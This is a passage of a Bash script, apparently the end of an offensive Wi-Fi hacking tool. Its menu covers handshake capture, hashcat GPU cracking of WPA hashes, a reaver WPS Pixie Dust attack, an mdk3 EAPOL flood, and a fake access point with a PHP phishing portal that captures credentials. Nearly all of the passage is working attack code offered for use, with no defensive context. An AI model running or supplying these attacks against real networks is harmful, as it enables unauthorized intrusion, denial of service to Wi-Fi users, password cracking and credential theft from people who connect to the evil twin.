			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			cat msfconsole.rc
			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
			popd > /dev/null 2>&1; credentials
		else
			tput civis; echo -e "\n${yellowColour}[*]${grayColour} Using custom template..."; sleep 1
			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $usedlogin\n"; sleep 1
			pushd $usedlogin > /dev/null 2>&1
			php -S 192.168.1.1:80 > /dev/null 2>&1 
			popd > /dev/null 2>&1; credentials
		fi

	cd $pathmain
	
}
caphccapx() {
	clear; tput civis; echo -e "$blueColour[*]$grayColour Starting .cap -> .hccapx converter"; sleep 2
	cd /usr/share/hashcat-utils
	tput cnorm; echo -ne "\n$greenColour[?]$grayColour Path to .cap file: " && read filecap
	echo -ne "$greenColour[?]$grayColour File name for hccapx: " && read namehccapx
	tput civis
	./cap2hccapx.bin $filecap ${pathmain}/${namehccapx}.hccapx
	echo -ne "$greenColour[*]$grayColour You now have your file or hash ready, Enter to continue" && read
	cd $pathmain
}
gpuhash() {
	clear; tput civis; echo -e "$blueColour[*]$grayColour Starting ForceBrute with GPU"; sleep 1
	tput cnorm; echo -ne "\n$yellowColour[?]$grayColour You have a file or hash in hccapx format? [Y/N]: " && read format
	if [ "$format" == "Y" ] || [ "$format" == "y" ]; then
		echo -ne "$redColour[?]$grayColour hccapx path: " && read pahc
		hashcat -I | grep "GPU"
		echo -ne "$redColour[?]$grayColour Device number when using: " && read numgpu
		echo -e "\n${yellowColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt"
		echo -ne "$redColour[?]$grayColour Dictionary path to use: " && read pathgpu
		tput civis
		hashcat -a 3 -m 2500 -D 2 -d $numgpu $pahc $pathgpu
		echo -ne "\n$greenColour[!]$grayColour Enter to continue" && read
	elif [ "$format" == "N" ] || [ "$format" == "n" ]; then
		echo -ne "$blueColour[?]$grayColour Do you have a .cap file or hash? [Y/N]: " && read filecap
		if [ "$filecap" == "Y" ] || [ "$filecap" == "y" ]; then
			caphccapx
		elif [ "$filecap" == "n" ] || [ "$filecap" == "N" ]; then
			echo -ne "$greenColour[?]$grayColour Do you want to do a Handshake attack to get a .cap and then convert it? [Y/N]: " && read attackyn
			if [ "$attackyn" == "Y" ] || [ "$attackyn" == "y" ]; then
				handshake_ataque
			else
				echo -e "$redColour[!]$grayColour You have to have a hash prepared for this attack"; sleep 3
			fi
		else
			echo -e "$redColour[!]$grayColour You have to have a hash prepared for this attack"; sleep 3
		fi 
	else
		gpuhash
	fi
}
gpuhand() {
	cd /usr/share/hashcat-utils
	./cap2hccapx.bin ${pathmain}/Handshake-01.cap ${pathmain}/Handshake.hccapx
	cd $pathmain
	hashcat -I
	echo -ne "$redColour[?]$grayColour Device number when using: " && read numgpu1
	echo -e "\n${yellowColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt"
	echo -ne "$redColour[?]$grayColour Dictionary path to use: " && read pathgpu1
	tput civis
	hashcat -a 0 -m 2500 -D 2 -d $numgpu1 Handshake.hccapx $pathgpu1
	echo -ne "\n$greenColour[!]$grayColour Enter to continue" && read
}

# Función para ataques WPS Pixie Dust
wps_pixie_dust() {
    echo -e "${greenColour}[*]${grayColour} Iniciando ataque WPS Pixie Dust${endColour}"; sleep 2
    echo -e "${yellowColour}[!]${grayColour} Escaneando puntos de acceso con WPS habilitado...${endColour}"
    xterm -hold -e "wash -i $tar -C" &
    wash_id=$!
    sleep 5

    echo -ne "${yellowColour}[?]${grayColour} Introduce el BSSID objetivo: ${endColour}" && read -r bssidwps
    echo -ne "${yellowColour}[?]${grayColour} Introduce el canal: ${endColour}" && read -r channelwps

    if [[ -z "$bssidwps" || -z "$channelwps" ]]; then
        echo -e "${redColour}[!]${grayColour} Error: BSSID o canal no válidos.${endColour}"
        kill $wash_id
        return 1
    fi

    echo -e "${blueColour}[*]${grayColour} Ejecutando ataque Pixie Dust...${endColour}"
    kill $wash_id
    reaver -i wlan0mon -b "$bssidwps" -c "$channelwps" -K 1 -vv
}

# Función para ataques EAPOL Flood
eapol_flood() {
    echo -e "${greenColour}[*]${grayColour} Iniciando ataque ${greenColour}EAPOL Flood${endColour}"; sleep 2
    echo -ne "${yellowColour}[?]${grayColour} Introduce el BSSID objetivo: ${endColour}" && read -r bssidea

    if [[ -z "$bssidea" ]]; then
        echo -e "${redColour}[!]${grayColour} Error: BSSID no válido.${endColour}"
        return 1
    fi

    echo -e "${yellowColour}[!]${grayColour} Enviando paquetes EAPOL...${endColour}"
    mdk3 "$tar" a -a "$bssidea"
}

# Función para configurar página de inicio de sesión falsa
fake_login_page() {
    echo -e "${blueColour}[*]${grayColour} Iniciando página de inicio de sesión falsa (Phishing)...${endColour}"; sleep 2
    echo -ne "${yellowColour}[?]${grayColour} Introduce el nombre del SSID falso: ${endColour}" && read -r fake_ssid

    if [[ -z "$fake_ssid" ]]; then
        fake_ssid="Free_WiFi"
    fi

    echo -e "${yellowColour}[!]${grayColour} Configurando punto de acceso falso...${endColour}"
    hostapd_conf="fakeap.conf"
    {
        echo "interface=$tar"
        echo "ssid=$fake_ssid"
        echo "channel=6"
    } >"$hostapd_conf"

    xterm -hold -e "hostapd $hostapd_conf" &
    sleep 2
    echo -e "${yellowColour}[!]${grayColour} Capturando credenciales...${endColour}"
    xterm -hold -e "php -S 0.0.0.0:8080 -t portal/" &
}

# Estimación del tiempo de ataque
attack_time_estimation() {
    echo -e "${blueColour}[*]${grayColour} Iniciando estimación de tiempo de ataque${endColour}"
    echo -ne "${yellowColour}[?]${grayColour} Introduce el tamaño del diccionario: ${endColour}" && read -r dict_size
    echo -ne "${yellowColour}[?]${grayColour} Introduce la velocidad de cracking (claves/seg): ${endColour}" && read -r speed

    if [[ -z "$dict_size" || -z "$speed" || $speed -le 0 ]]; then
        echo -e "${redColour}[!]${grayColour} Error: Tamaño del diccionario o velocidad no válidos.${endColour}"
        return 1
    fi

    time_estimate=$((dict_size / speed))
    echo -e "${greenColour}[+]${grayColour} Tiempo estimado: ${time_estimate} segundos${endColour}"
}

# Cracking en la nube
cloud_cracking() {
    echo -e "${blueColour}[*]${grayColour} Iniciando cracking en la nube${endColour}"
    echo -ne "${yellowColour}[?]${grayColour} Introduce la ruta al archivo .cap: ${endColour}" && read -r cap_file

    if [[ ! -f "$cap_file" ]]; then
        echo -e "${redColour}[!]${grayColour} Error: Archivo .cap no encontrado.${endColour}"
        return 1
    fi

    echo -e "${yellowColour}[!]${grayColour} Convirtiendo a formato .hccapx...${endColour}"
    aircrack-ng -J output "$cap_file"
    echo -e "${yellowColour}[!]${grayColour} Sube el archivo 'output.hccapx' a tu servicio en la nube.${endColour}"
}

# Escaneo de redes ocultas
hidden_network_scan() {
    echo -e "${blueColour}[*]${grayColour} Iniciando escaneo de redes ocultas${endColour}"
    echo -e "${yellowColour}[!]${grayColour} Escaneando SSIDs ocultos...${endColour}"
    xterm -hold -e "airodump-ng $tar --essid '' --channel 1-13" &
}

#banner main
banner() {
	echo "  _       __  _   ____  _      ____                               __      __ "
	echo " | |     / / (_) / __/ (_)    / __ \ _      __  ____   ___   ____/ / ____/ / "
	echo " | | /| / / / / / /_  / /    / /_/ /| | /| / / / __ \ / _ \ / __  / / __  /   "
	echo " | |/ |/ / / / / __/ / /    / ____/ | |/ |/ / / / / //  __// /_/ / / /_/ /  "
	echo " |__/|__/ /_/ /_/   /_/    /_/      |__/|__/ /_/ /_/ \___/ \__,_/  \__,_/  "
}
bannermainattack() {
	bannerattack
	echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Fake Access Point\t\t${turquoiseColour}[+]${grayColour} Cracking password"
	echo -e "${yellowColour}\n[1] Handshake Attack\t\t[8] Wifiphisher/Evil Twin\t[10] Force Brute .cap"
	echo -e "[2] PMKID Attack\t\t[9] Fake/Rogue AP\t\t[11] Hash .cap -> .hccapx"
	echo -e "[3] DoS Attack\t\t\t\t\t\t\t[12] Hashed Dictionary (Rainbow tables)"
	echo -e "[4] Beacon Flood Attack\t\t\t\t\t\t[13] Force Brute with GPU"
	echo -e "[5] Network traffic"
	echo -e "[6] Scanner"
	echo -e "[7] DoS Attack for Client"
	echo -e "\n[99] Exit and restart the network card\n"
	tput cnorm
	echo -ne "${blueColour}[?]${grayColour} Attack: " && read opcion
	$cleancolor
	case $opcion in
		1)
		handshake_ataque
		;;
		2)
		pkmid_ataque
		;;
		3)
		dosattack
		;;
		4)
		beaconflood
		;;
		5)
		traffic
		;;
		6)
		scanner
		;;
		7)
		dosforclient
		;;
		8)
		ntwkphishing
		;;
		9)
		fakeap
		;;
		10)
		fuerza_.cap
		;;
		11)
		caphccapx
		;;
		12)
		rainbowtaibles
		;;
		13)
		gpuhash
		;;
		22)
		wps_pixie_dust
		;;
		23)
		eapol_flood
		;;
		24)
		fake_login_page
		;;
		25)
		attack_time_estimation
		;;
		26)
		cloud_cracking
		;;
		27)
		hidden_network_scan
		;;
		99)
		exitresart
		;;
		*)
		echo -e "${redColour}\n[!]$grayColour Invalid Option"; sleep 2
		;;
		esac
}

#Checks if the tool was run as root
if [ $(id -u) -ne 0 ]; then
	echo -e "$redColour\n[!]$grayColour Must be root (sudo $0)\n"
	$cleancolor
	exit 1
#if the tool was run as root, run the updatepackages, check the dependencies and run the main code
else
	pathmain=$(pwd)
	tput civis; clear
	echo -e "${turquoiseColour}"
	banner
	echo -e "\n${greenColour}[+]${grayColour} Version 3"
	echo -e "${greenColour}[+]${grayColour} Github: https://github.com/Kidd3n"
	echo -e "${greenColour}[+]${grayColour} Discord ID: kidd3n.sh"
	echo -ne "\n${greenColour}[+]$grayColour Enter to continue" && read 
	updatepackages
	monitormode
	while true; do
		bannermainattack
		done
fi